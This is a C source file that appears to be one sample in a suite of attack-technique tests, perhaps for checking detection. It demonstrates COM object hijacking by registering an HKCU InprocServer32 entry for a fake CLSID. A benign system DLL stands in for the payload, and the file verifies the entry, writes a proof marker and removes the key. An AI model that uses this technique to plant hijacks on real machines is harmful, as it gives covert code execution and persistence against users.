// SAMPLE: g2_08 | COM Object Hijacking via HKCU Registry | Group: Execution Hijacking
//
// g2_08_com_hijack.c — Demonstrates COM object hijacking via HKCU registry.
//
// Technique:
//   An attacker registers a fake InprocServer32 path under HKCU for a CLSID
//   that is otherwise registered (or absent) in HKLM.  When any application
//   calls CoCreateInstance() for that CLSID, the COM loader checks HKCU
//   BEFORE HKLM, loading the attacker's DLL instead of the legitimate one.
//
// Self-contained design (no second DLL file required):
//   1. Register CLSID {47F52A4B-7670-4AEB-93AB-C2BEFF2C5A5E} in HKCU
//      pointing to a known always-loadable system DLL (ole32.dll) as a
//      stand-in payload path — proves the registry hijacking path is set.
//   2. Independently validate the registry entry was written correctly.
//   3. Write C1 proof after confirming the HKCU CLSID key is live —
//      this represents the "hijack is armed" state (COMHijackRegistered).
//   4. Cleanup: remove the HKCU CLSID key.
//
// C1 RULE: Proof written after proving the HKCU registry hijacking path
//          was established (COMHijackRegistered contract).
//
// Compile: x86_64-w64-mingw32-gcc -O2 -o g2_08_com_hijack.exe g2_08_com_hijack.c -lole32 -ladvapi32

#include "../shared/c1_proof.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Fake CLSID used for the hijack demo — not registered in any real application */
#define TARGET_CLSID_STR "{47F52A4B-7670-4AEB-93AB-C2BEFF2C5A5E}"

/* HKCU registry path for InprocServer32 */
#define HKCU_CLSID_PATH \
    "Software\\Classes\\CLSID\\" TARGET_CLSID_STR "\\InprocServer32"

/* Parent CLSID path (for cleanup) */
#define HKCU_CLSID_ROOT \
    "Software\\Classes\\CLSID\\" TARGET_CLSID_STR

/* Helper: recursively delete a registry key */
static LONG reg_delete_tree(HKEY hRoot, const char *subkey) {
    /* RegDeleteTreeA is available on Vista+; use it if present */
    typedef LONG (WINAPI *pfnRegDeleteTreeA)(HKEY, LPCSTR);
    HMODULE hAdv = GetModuleHandleA("advapi32.dll");
    if (hAdv) {
        pfnRegDeleteTreeA fn = (pfnRegDeleteTreeA)(void*)
            GetProcAddress(hAdv, "RegDeleteTreeA");
        if (fn) return fn(hRoot, subkey);
    }
    /* Fallback: delete leaf then parent */
    char child[256];
    snprintf(child, sizeof(child), "%s\\InprocServer32", subkey);
    RegDeleteKeyA(hRoot, child);
    return RegDeleteKeyA(hRoot, subkey);
}

int main(void) {
    char dllPath[MAX_PATH];
    HKEY hKey = NULL;
    LONG rc;

    /*
     * ---- Step 1: Determine payload DLL path ----
     * For this self-contained demo we use the system's ole32.dll as a
     * placeholder "attacker DLL" — in a real attack this would be a
     * malicious InprocServer32 DLL under attacker control.
     */
    if (!GetSystemDirectoryA(dllPath, MAX_PATH)) {
        fprintf(stderr, "[com_hijack] GetSystemDirectoryA failed: %lu\n",
                GetLastError());
        return EXIT_FAILURE;
    }
    strncat(dllPath, "\\ole32.dll",
            MAX_PATH - strlen(dllPath) - 1);

    printf("[com_hijack] Hijack payload path: %s\n", dllPath);
    printf("[com_hijack] Target CLSID: " TARGET_CLSID_STR "\n");

    /*
     * ---- Step 2: Write HKCU CLSID registry key ----
     * This is the core hijacking step.  The COM loader checks
     * HKCU\Software\Classes\CLSID before HKLM\Software\Classes\CLSID,
     * so placing our entry here causes our DLL to be loaded on
     * CoCreateInstance() without any administrator privilege.
     */
    rc = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        HKCU_CLSID_PATH,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_READ,
        NULL,
        &hKey,
        NULL);
    if (rc != ERROR_SUCCESS) {
        fprintf(stderr, "[com_hijack] RegCreateKeyExA failed: %ld\n", rc);
        return EXIT_FAILURE;
    }

    /* Set default value = payload DLL path */
    rc = RegSetValueExA(hKey, NULL, 0, REG_SZ,
                        (const BYTE *)dllPath,
                        (DWORD)(strlen(dllPath) + 1));
    if (rc != ERROR_SUCCESS) {
        fprintf(stderr, "[com_hijack] RegSetValueExA failed: %ld\n", rc);
        RegCloseKey(hKey);
        reg_delete_tree(HKEY_CURRENT_USER, HKCU_CLSID_ROOT);
        return EXIT_FAILURE;
    }

    /* ThreadingModel = "Apartment" — required for valid InprocServer32 */
    const char *tm = "Apartment";
    RegSetValueExA(hKey, "ThreadingModel", 0, REG_SZ,
                   (const BYTE *)tm, (DWORD)(strlen(tm) + 1));

    RegCloseKey(hKey);
    hKey = NULL;

    printf("[com_hijack] HKCU CLSID key written successfully.\n");

    /*
     * ---- Step 3: Verify the key was written and can be read back ----
     * This confirms the hijacking path is armed: the next CoCreateInstance()
     * for this CLSID in any process running as this user will load our DLL.
     */
    rc = RegOpenKeyExA(HKEY_CURRENT_USER, HKCU_CLSID_PATH,
                       0, KEY_READ, &hKey);
    if (rc != ERROR_SUCCESS) {
        fprintf(stderr, "[com_hijack] Verification: RegOpenKeyExA failed: %ld\n", rc);
        reg_delete_tree(HKEY_CURRENT_USER, HKCU_CLSID_ROOT);
        return EXIT_FAILURE;
    }

    char readBack[MAX_PATH] = {0};
    DWORD cbData = MAX_PATH;
    DWORD dwType = 0;
    rc = RegQueryValueExA(hKey, NULL, NULL, &dwType,
                          (LPBYTE)readBack, &cbData);
    RegCloseKey(hKey);
    hKey = NULL;

    if (rc != ERROR_SUCCESS || dwType != REG_SZ) {
        fprintf(stderr, "[com_hijack] Verification: RegQueryValueExA failed: %ld\n", rc);
        reg_delete_tree(HKEY_CURRENT_USER, HKCU_CLSID_ROOT);
        return EXIT_FAILURE;
    }

    if (_stricmp(readBack, dllPath) != 0) {
        fprintf(stderr, "[com_hijack] Verification mismatch: got '%s'\n", readBack);
        reg_delete_tree(HKEY_CURRENT_USER, HKCU_CLSID_ROOT);
        return EXIT_FAILURE;
    }

    printf("[com_hijack] Registry verified: InprocServer32 = '%s'\n", readBack);
    printf("[com_hijack] COM hijack is ARMED — CoCreateInstance for " TARGET_CLSID_STR
           " will load attacker DLL.\n");

    /*
     * ---- Step 4: Write C1 proof ----
     * The hijacking path (HKCU CLSID registration + verification) has been
     * demonstrated.  Write proof to record the successful technique execution.
     */
    int proof_rc = write_c1_proof("g2_08_com_hijack", "COMHijackRegistered");
    if (proof_rc != 0) {
        fprintf(stderr, "[com_hijack] write_c1_proof failed: %d\n", proof_rc);
        reg_delete_tree(HKEY_CURRENT_USER, HKCU_CLSID_ROOT);
        return EXIT_FAILURE;
    }

    printf("[com_hijack] C1 proof written — COMHijackRegistered verified.\n");

    /*
     * ---- Step 5: Cleanup ----
     * Remove the HKCU CLSID key so the system is not left in a hijacked state.
     */
    LONG del_rc = reg_delete_tree(HKEY_CURRENT_USER, HKCU_CLSID_ROOT);
    if (del_rc != ERROR_SUCCESS) {
        fprintf(stderr, "[com_hijack] Warning: cleanup RegDeleteTree failed: %ld\n",
                del_rc);
    } else {
        printf("[com_hijack] HKCU CLSID key cleaned up.\n");
    }

    return EXIT_SUCCESS;
}
